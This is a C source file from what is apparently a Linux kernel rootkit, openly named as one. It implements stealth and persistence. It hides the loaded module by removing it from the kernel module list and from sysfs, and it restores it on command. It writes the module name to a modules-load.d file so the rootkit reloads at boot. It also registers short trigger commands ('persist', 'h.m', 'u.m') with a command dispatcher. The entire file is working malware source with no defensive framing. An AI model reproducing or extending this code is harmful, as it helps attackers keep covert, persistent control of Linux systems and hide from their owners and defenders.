// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/workqueue.h>

/* Module hiding: remove/restore THIS_MODULE from both inventories.
 *
 * kobject_del removes the sysfs subtree. On unhide we restore the
 * module list so it appears in /proc/modules again. */

static struct list_head *saved_prev;
static struct kobject *saved_parent;

void rk_module_hide(void)
{
	if (saved_prev)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	saved_parent = THIS_MODULE->mkobj.kobj.parent;
	kobject_del(&THIS_MODULE->mkobj.kobj);
}

void rk_module_unhide(void)
{
	if (!saved_prev)
		return;
	(void)kobject_add(&THIS_MODULE->mkobj.kobj, saved_parent,
			  "%s", MODULE_NAME_STR);
	saved_parent = NULL;
	list_add(&THIS_MODULE->list, saved_prev);
	saved_prev = NULL;
}

/*
 * Persistence: write/clear /etc/modules-load.d entry.
 *
 * Command handlers run from the kretprobe entry path (atomic context,
 * preemption disabled). filp_open and kernel_write can sleep, so the
 * file I/O is deferred to the system workqueue via schedule_work.
 */

static void do_persist(struct work_struct *w)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return;
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
}

static void do_unpersist(struct work_struct *w)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return;
	filp_close(f, NULL);
}

static DECLARE_WORK(persist_work, do_persist);
static DECLARE_WORK(unpersist_work, do_unpersist);

/* Command handlers */

static int cmd_persist(const char *arg) { schedule_work(&persist_work); return 0; }
static int cmd_unpersist(const char *arg) { schedule_work(&unpersist_work); return 0; }
static int cmd_hide_module(const char *arg) { rk_module_hide(); return 0; }
static int cmd_unhide_module(const char *arg) { rk_module_unhide(); return 0; }

static const struct rk_cmd_entry module_cmds[] = {
	{ "persist",   cmd_persist },
	{ "unpersist", cmd_unpersist },
	{ "h.m",       cmd_hide_module },
	{ "u.m",       cmd_unhide_module },
};

int rk_module_cmds_init(void)
{
	return rk_cmds_register(module_cmds, ARRAY_SIZE(module_cmds));
}
